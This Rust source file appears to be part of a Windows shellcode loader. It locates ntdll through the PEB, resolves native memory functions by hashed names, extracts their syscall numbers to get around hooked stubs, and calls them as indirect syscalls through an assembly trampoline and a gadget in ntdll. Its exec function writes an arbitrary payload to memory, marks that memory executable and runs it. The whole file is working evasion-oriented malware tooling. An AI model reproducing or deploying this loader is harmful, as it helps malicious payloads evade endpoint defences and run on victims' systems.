use crate::{hash, ntdll};
use core::ptr;

pub const CURRENT_PROCESS: usize = usize::MAX; // (HANDLE)-1

pub const MEM_COMMIT_RESERVE: usize = 0x3000;
pub const PAGE_READWRITE: usize = 0x04;
pub const PAGE_EXECUTE_READ: usize = 0x20;
pub const PAGE_SIZE: usize = 0x1000;
pub const MEM_RELEASE: usize = 0x8000;

#[derive(Clone, Copy, Debug)]
pub struct Targets {
    pub ntdll_base: usize,
    pub nt_allocate: usize,
    pub nt_protect: usize,
    pub nt_free: usize,
    pub ssn_allocate: u32,
    pub ssn_protect: u32,
    pub ssn_free: u32,
    pub gadget: usize,
}

#[derive(Debug)]
pub enum Error {
    NoNtdll,
    Unresolved(&'static str),
    SsnExtraction(&'static str),
    NoGadget,
    NtStatus { op: &'static str, status: i32 },
    EmptyPayload,
}

impl core::fmt::Display for Error {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            Error::NoNtdll => write!(f, "ntdll.dll not found in the PEB loader list"),
            Error::Unresolved(n) => write!(f, "could not resolve {n} in ntdll exports"),
            Error::SsnExtraction(n) => write!(f, "could not extract SSN for {n} (hooked stub?)"),
            Error::NoGadget => write!(f, "could not locate a syscall gadget"),
            Error::NtStatus { op, status } => write!(f, "{op} failed: NTSTATUS {status:#010x}"),
            Error::EmptyPayload => write!(f, "payload is empty"),
        }
    }
}

pub unsafe fn resolve_targets() -> Result<Targets, Error> {
    let ntdll_base = ntdll::get_ntdll_base();
    if ntdll_base.is_null() {
        return Err(Error::NoNtdll);
    }

    let nt_allocate = ntdll::resolve_export(ntdll_base, hash::NALLOC);
    let nt_protect = ntdll::resolve_export(ntdll_base, hash::NPROTECT);
    let nt_free = ntdll::resolve_export(ntdll_base, hash::NFREE);
    if nt_allocate.is_null() {
        return Err(Error::Unresolved("NtAllocateVirtualMemory"));
    }
    if nt_protect.is_null() {
        return Err(Error::Unresolved("NtProtectVirtualMemory"));
    }

    let ssn_allocate = ntdll::syscall_number_robust(ntdll_base, nt_allocate)
        .ok_or(Error::SsnExtraction("NtAllocateVirtualMemory"))?;
    let ssn_protect = ntdll::syscall_number_robust(ntdll_base, nt_protect)
        .ok_or(Error::SsnExtraction("NtProtectVirtualMemory"))?;
    let ssn_free = if nt_free.is_null() {
        0
    } else {
        ntdll::syscall_number_robust(ntdll_base, nt_free).unwrap_or(0)
    };

    let gadget = ntdll::syscall_gadget(nt_allocate).ok_or(Error::NoGadget)?;

    Ok(Targets {
        ntdll_base: ntdll_base as usize,
        nt_allocate: nt_allocate as usize,
        nt_protect: nt_protect as usize,
        nt_free: nt_free as usize,
        ssn_allocate,
        ssn_protect,
        ssn_free,
        gadget,
    })
}

pub unsafe fn exec(code: &[u8]) -> Result<(), Error> {
    if code.is_empty() {
        return Err(Error::EmptyPayload);
    }
    let t = resolve_targets()?;

    // NtAllocateVirtualMemory(CurrentProcess, &base, 0, &size, MEM_COMMIT|RESERVE, PAGE_READWRITE)
    let mut base: *mut u8 = ptr::null_mut();
    let mut size: usize = round_up(code.len(), PAGE_SIZE);
    let status = raw(
        t.ssn_allocate,
        t.gadget,
        [
            CURRENT_PROCESS,
            &mut base as *mut _ as usize,
            0,
            &mut size as *mut _ as usize,
            MEM_COMMIT_RESERVE,
            PAGE_READWRITE,
            0,
            0,
            0,
            0,
        ],
    );
    if status < 0 || base.is_null() {
        return Err(Error::NtStatus {
            op: "NtAllocateVirtualMemory",
            status: status as i32,
        });
    }

    ptr::copy_nonoverlapping(code.as_ptr(), base, code.len());

    // NtProtectVirtualMemory(CurrentProcess, &base, &size, PAGE_EXECUTE_READ, &old)
    let mut old = 0u32;
    let status = raw(
        t.ssn_protect,
        t.gadget,
        [
            CURRENT_PROCESS,
            &mut base as *mut _ as usize,
            &mut size as *mut _ as usize,
            PAGE_EXECUTE_READ,
            &mut old as *mut _ as usize,
            0,
            0,
            0,
            0,
            0,
        ],
    );
    if status < 0 {
        free(&t, base, size);
        return Err(Error::NtStatus {
            op: "NtProtectVirtualMemory",
            status: status as i32,
        });
    }

    let entry: extern "system" fn() = core::mem::transmute(base);
    entry();

    free(&t, base, size);
    Ok(())
}

unsafe fn free(t: &Targets, base: *mut u8, size: usize) {
    if t.nt_free == 0 || base.is_null() {
        return;
    }
    let mut addr = base;
    let mut sz = size;
    // NtFreeVirtualMemory(CurrentProcess, &addr, &sz, MEM_RELEASE)
    let _ = raw(
        t.ssn_free,
        t.gadget,
        [
            CURRENT_PROCESS,
            &mut addr as *mut _ as usize,
            &mut sz as *mut _ as usize,
            MEM_RELEASE,
            0,
            0,
            0,
            0,
            0,
            0,
        ],
    );
}

#[inline]
fn round_up(value: usize, align: usize) -> usize {
    match value.checked_next_multiple_of(align) {
        Some(v) => v,
        None => value, // overflow: let NtAllocateVirtualMemory reject it
    }
}

// ---------------------------------------------------------------------------
// Platform layer: the actual trampoline.
// ---------------------------------------------------------------------------

#[cfg(all(windows, target_arch = "x86_64"))]
mod platform {
    use core::arch::global_asm;
    use core::sync::atomic::{AtomicU32, AtomicUsize, Ordering};

    global_asm!(
        ".text",
        ".globl __nt_syscall",
        ".p2align 4",
        "__nt_syscall:",
        "mov r10, rcx",
        "mov eax, dword ptr [rip + __g_ssn]",
        "jmp qword ptr [rip + __g_gadget]",
    );

    #[no_mangle]
    #[used]
    static __g_ssn: AtomicU32 = AtomicU32::new(0);
    #[no_mangle]
    #[used]
    static __g_gadget: AtomicUsize = AtomicUsize::new(0);

    extern "system" {
        fn __nt_syscall(
            a1: usize,
            a2: usize,
            a3: usize,
            a4: usize,
            a5: usize,
            a6: usize,
            a7: usize,
            a8: usize,
            a9: usize,
            a10: usize,
        ) -> isize;
    }

    pub unsafe fn raw(ssn: u32, gadget: usize, args: [usize; 10]) -> isize {
        __g_ssn.store(ssn, Ordering::Relaxed);
        __g_gadget.store(gadget, Ordering::Relaxed);
        __nt_syscall(
            args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8],
            args[9],
        )
    }
}

#[cfg(not(all(windows, target_arch = "x86_64")))]
mod platform {
    pub unsafe fn raw(_ssn: u32, _gadget: usize, _args: [usize; 10]) -> isize {
        -1
    }
}

pub use platform::raw;
